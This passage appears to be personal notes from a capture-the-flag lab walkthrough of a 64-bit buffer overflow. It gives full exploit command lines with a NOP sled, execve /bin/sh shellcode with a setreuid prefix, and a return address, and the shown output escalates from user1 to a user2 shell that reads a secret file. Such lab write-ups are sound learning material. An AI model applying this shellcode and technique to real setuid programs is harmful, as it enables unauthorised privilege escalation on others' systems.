Let's use another address. We hop later in out nops and try again (x70 to x80):

changing to:
```sh
r2 -d -A buffer-overflow $(python -c "print('\x90'*(152-40-10)+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x41'*10+'\x80\xe2\xff\xff\xff\x7f\x00\x00')")
```

```sh
[user1@ip-10-10-60-107 overflow-3]$ ./buffer-overflow $(python -c "print('\x90'*(152-40-10)+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x90'*10+'\x80\xe2\xff\xff\xff\x7f\x00\x00')")
Here's a program that echo's out your input
������������������������������������������������������������������������������������������������������j;XH1�I�//bin/shI�APH��RWH��j<XH1����������������
sh-4.2$ whoami
user1
sh-4.2$ exit
```
Works but we've not getting the permissions of user2.


Adding this from internet
![[Images/1__j9xQL5XV_uI9D4icHL_lg.webp]]

```sh
[user1@ip-10-10-60-107 overflow-3]$ ./buffer-overflow $(python -c "print('\x90'*(152-40-10)+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x41'*10+'\x80\xe2\xff\xff\xff\x7f\x00\x00')")
Here's a program that echo's out your input
������������������������������������������������������������������������������������������������������j;XH1�I�//bin/shI�APH��RWH��j<XH1�AAAAAAAAAA�����
sh-4.2$ whoami
user1
sh-4.2$ exit
exit
[user1@ip-10-10-60-107 overflow-3]$ ./buffer-overflow $(python -c "print('\x90'*(152-14-40-10)+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05'+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x41'*10+'\x80\xe2\xff\xff\xff\x7f\x00\x00')")
Here's a program that echo's out your input
����������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1�AAAAAAAAAA�����
sh-4.2$ whoami
user2
sh-4.2$ cat secret.txt
omgyoudidthissocool!!
```
